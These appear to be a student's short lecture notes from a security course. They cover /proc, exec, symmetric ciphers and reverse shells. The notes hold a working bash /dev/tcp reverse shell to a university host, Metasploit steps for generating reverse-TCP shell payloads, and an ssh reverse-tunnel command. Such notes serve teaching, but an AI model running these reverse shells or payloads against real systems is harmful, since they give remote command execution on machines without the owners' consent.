Get around the lack of ```-e``` in netcat by using a **named pipe**

###/proc
It's an entirely simulated directory of unreal files to give information on current processes
###exec
As a linux command, it replaces the shell with whatever follows exec:

Dangerous Example: ```exec ls``` will ls and then kill itself upon completion. Boom goes your shell

###Bash Sockets (spawning a reverse shell entirely with bash)

    exec 5<>/dev/tcp/moxie.cs.colorado.edu/8888
    cat <&5 | while read line; do $line 2>&5 >&5; done

###Metasploit

    msf console
    use payload/linux/x86/shell/ <tab>

    use payload/linux/x86/shell/shell_reverse_tcp
    set LHOST 128.138.___.___
    set LPORT 8888
    generate -t c

    //or
    generate -t python

    //or if victim does not allow byte x31
    generate -b 31

###Symettric key cryptography
Alice and Bob (A & B) have a key and nobody else does
<br>Examples:
* AES-CBC
* 3DES-EDE-CBC
* RC4

###ssh reverse shell

    ssh -R 22:localhost:9001 dabo6422@moxie.cs.colorado.edu
